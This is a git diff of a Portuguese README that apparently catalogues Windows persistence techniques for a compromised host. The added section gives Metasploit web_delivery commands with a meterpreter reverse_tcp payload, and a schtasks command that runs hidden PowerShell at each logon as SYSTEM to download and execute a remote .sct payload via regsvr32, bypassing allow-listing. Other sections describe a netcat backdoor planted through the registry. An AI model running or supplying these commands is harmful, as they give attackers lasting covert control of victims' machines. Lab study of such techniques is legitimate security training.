@@ -23,6 +23,7 @@ Eu sou o Stux e estarei constantemente atualizando este repositório com novas t
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
+
 Essa técnica tem como objetivo criar um serviço persistente no windows explorado na qual executará diversas vezes o payload de conexão reversa.
 
 Etapas:
@@ -63,6 +64,7 @@ Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
+
 Nessa técnica, iremos realizar o upload do netcat para o alvo e iremos modificar um registro para que o alvo execute ele, nos abrindo uma porta para conectar posteriormente quando necessário.
 
 Etapas:
@@ -109,8 +111,40 @@ Etapas:
 
 Overview:
 
+Nessa técnica, iremos utilizar como backdoor o módulo do metasploit chamado "Script Web Delivery". Este módulo aciona rapidamente um servidor web que serve uma carga útil. O módulo fornecerá um comando a ser executado na máquina de destino com base no destino selecionado. O comando fornecido baixará e executará uma carga útil usando um interpretador de linguagem de script especificado ou "squablydoo" via regsvr32.exe para ignorar a lista de permissões do aplicativo. Usaremos o link gerado para criar uma tarefa que acionará o link malicioso toda vez que o login do usuário no sistema for realizado.
+
 Etapas:
-- 
+- No metasploit, iniciaremos o módulo "Script Web Delivery", vamos configurar-lo e copiar o link gerado.
+```bash
+use multi/script/web_delivery
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set TARGET 3
+set LHOST SEUIP
+exploit
+```
+
+![Screenshot_1](https://user-images.githubusercontent.com/67444297/198840163-b4093e55-9bd5-4415-8661-d2d948e17617.png)
+
+![Screenshot_2](https://user-images.githubusercontent.com/67444297/198840164-e098778b-876f-4e8f-84b3-72ed94aa199a.png)
+
+- No meterpreter, vamos carregar a extensão powershell e criar a tarefa de execução do link malicioso gerado no web delivery.
+```bash
+load powershell
+powershell_shell
+schtasks /create /tn AttackDefense /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'regsvr32 /s /n /u /i:http://10.10.23.3:8080/kpTJ2uK6kYL.sct scrobj.dll'" /sc onlogon /ru System
+```
+**Note que, o link acima deve ser substituído pelo o que você gerou.**
+
+![Screenshot_3](https://user-images.githubusercontent.com/67444297/198840166-cd90afff-b811-4065-9ba3-70d9c79a815d.png)
+
+Para prova de conceito, iremos dar um reboot na máquina explorada para que nossa tarefa seja executada.
+
+![Screenshot_4](https://user-images.githubusercontent.com/67444297/198840167-3532082f-3dca-4e0c-b002-3eee09218f46.png)
+
+- E então, visualizamos novamente a aba com o web_delivery na qual receberemos nossa shell.
+
+![Screenshot_5](https://user-images.githubusercontent.com/67444297/198840168-3b5f04a7-1f47-464d-bfd8-96d8c22f2aa8.png)
+
 
 ### Schtasks - Log Events
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
